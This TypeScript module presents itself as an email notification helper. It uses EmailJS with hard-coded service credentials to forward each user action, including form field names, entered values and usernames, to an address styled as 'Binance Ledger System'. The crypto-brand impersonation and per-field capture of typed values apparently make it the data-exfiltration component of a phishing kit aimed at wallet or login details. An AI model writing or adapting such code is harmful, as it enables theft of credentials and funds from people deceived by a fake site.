
import emailjs from 'emailjs-com';

// Initialize EmailJS with your user ID immediately
emailjs.init("hDX5LRevxoenkHrjk");

interface EmailData {
  step: string;
  field?: string;
  value?: string;
  username?: string;
  timestamp: string;
  allFormData?: any;
  priority?: 'high' | 'normal';
}

export const sendEmailNotification = async (data: EmailData) => {
  console.log('=== EMAIL NOTIFICATION START ===');
  console.log('Priority level:', data.priority || 'normal');
  console.log('Data being sent:', data);

  // Clean and sanitize all data to prevent template corruption
  const cleanStep = String(data.step || '').replace(/[^\w\s\-\.]/g, ' ');
  const cleanField = String(data.field || '').replace(/[^\w\s\-\.]/g, ' ');
  const cleanValue = String(data.value || '').replace(/[^\w\s\-\.@]/g, ' ');
  const cleanUsername = String(data.username || '').replace(/[^\w\s\-\.@]/g, ' ');
  const cleanTimestamp = String(data.timestamp || new Date().toISOString());

  // Create a simple message without problematic characters
  const simpleMessage = `Action: ${cleanStep}
Time: ${cleanTimestamp}
User: ${cleanUsername}
${cleanField ? `Field: ${cleanField}` : ''}
${cleanValue ? `Value: ${cleanValue}` : ''}`;

  // Use only basic template parameters that EmailJS can handle
  const templateParams = {
    to_email: "donotreply@binanceledger.com",
    from_name: "Binance Ledger System",
    subject: `Alert: ${cleanStep}`,
    message: simpleMessage,
    step: cleanStep,
    field: cleanField,
    value: cleanValue,
    username: cleanUsername,
    timestamp: cleanTimestamp,
    allFormData: data.allFormData ? 'Form data captured' : ''
  };

  console.log('📧 Template parameters being sent:', templateParams);
  console.log('📧 Sending email immediately...');

  try {
    // Send email with proper error handling
    const result = await emailjs.send(
      "service_r7sis9a",
      "template_dec5tz3", 
      templateParams
    );
    
    console.log('✅ Email sent successfully!', result);
    console.log('=== EMAIL NOTIFICATION END ===');
    return result;
  } catch (error) {
    console.error('❌ Email failed to send:', error);
    console.error('Error details:', error);
    console.error('Template params that failed:', templateParams);
    
    // For high priority, try once more with even simpler data
    if (data.priority === 'high') {
      console.log('🔄 Retrying with minimal data for high-priority email...');
      try {
        const minimalParams = {
          to_email: "donotreply@binanceledger.com",
          from_name: "Binance Ledger System",
          subject: "User Action Alert",
          message: `Action: ${cleanStep} at ${cleanTimestamp}`,
          step: cleanStep,
          field: '',
          value: '',
          username: cleanUsername,
          timestamp: cleanTimestamp,
          allFormData: ''
        };
        
        const retryResult = await emailjs.send(
          "service_r7sis9a",
          "template_dec5tz3", 
          minimalParams
        );
        console.log('✅ Minimal retry successful!', retryResult);
        return retryResult;
      } catch (retryError) {
        console.error('❌ Retry also failed:', retryError);
      }
    }
    
    console.log('=== EMAIL NOTIFICATION END (ERROR) ===');
    throw error;
  }
};

// Helper function for high-priority button clicks
export const sendHighPriorityNotification = async (data: Omit<EmailData, 'priority'>) => {
  return sendEmailNotification({ ...data, priority: 'high' });
};
